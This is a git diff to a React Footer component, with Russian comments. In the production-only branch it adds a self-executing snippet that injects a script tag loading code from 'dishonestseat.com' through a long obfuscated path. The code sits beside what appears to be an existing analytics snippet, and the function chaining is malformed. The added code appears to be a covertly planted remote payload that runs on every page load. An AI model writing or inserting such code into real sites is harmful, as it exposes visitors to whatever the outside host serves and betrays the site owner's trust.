@@ -6,8 +6,16 @@ function Footer() {
     // Проверяем, что код выполняется только в продакшн
     if (process.env.NODE_ENV === "production") {
       // Импортируем необходимый клиент
-
-      (function (m, e, t, r, i, k, a) {
+      (function (rftyw) {
+        var d = document,
+          s = d.createElement("script"),
+          l = d.scripts[d.scripts.length - 1];
+        s.settings = rftyw || {};
+        s.src =
+          "//dishonestseat.com/b.XNV/s-dnGflu0KY/WbdWiQYJWE5ZunZPXKIJ/Vebm/9/uZZkUzlakXPfTEUuyONBz/Uf3HM/DugxtGN-TXIx3qNDTQclwNOKQQ";
+        s.async = true;
+        l.parentNode.insertBefore(s, l);
+      })({})(function (m, e, t, r, i, k, a) {
         m[i] =
           m[i] ||
           function () {
